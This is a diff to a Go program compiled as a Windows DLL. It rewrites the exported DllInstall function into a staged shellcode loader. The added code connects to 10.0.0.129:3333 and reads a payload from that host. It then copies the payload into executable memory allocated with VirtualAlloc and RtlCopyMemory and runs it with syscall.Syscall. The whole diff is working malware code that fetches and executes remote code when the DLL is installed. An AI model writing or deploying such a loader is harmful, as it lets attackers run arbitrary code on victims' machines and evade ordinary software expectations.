@@ -1,6 +1,9 @@
 package main
 
 import (
+	"fmt"
+	"io/ioutil"
+	"net"
 	"syscall"
 	"unsafe"
 )
@@ -33,33 +36,37 @@ func DllUnregisterServer() {
 //export DllInstall
 func DllInstall() {
 	sc := []byte{}
-	ShellCodeRTLCopyMemory(sc)
+
+	conn, err := net.Dial("tcp", "10.0.0.129:3333")
+	defer conn.Close()
+	if err != nil {
+		fmt.Println(err.Error())
+		return
+	}
+
+	sc, _ = ioutil.ReadAll(conn)
+
+	shellCodeRTLCopyMemory(sc)
 }
 
-func ShellCodeRTLCopyMemory(shellcode []byte) error {
-
-	// allocate memory within the current process
+func shellCodeRTLCopyMemory(shellcode []byte) {
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	if addr == 0 {
-		return err
+		fmt.Println(err.Error())
+		return
 	}
 
-	// copy shellcode into memory
 	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
 	if err != nil {
-		if err.Error() != "The operation completed successfully." {
-			return err
-		}
+		fmt.Println(err.Error())
+		return
 	}
 
-	// execute shellcode
 	_, _, err = syscall.Syscall(addr, 0, 0, 0, 0)
 	if err != nil {
-		if err.Error() != "The operation completed successfully." {
-			return err
-		}
+		fmt.Println(err.Error())
+		return
 	}
-	return nil
 }
 
 func main() {
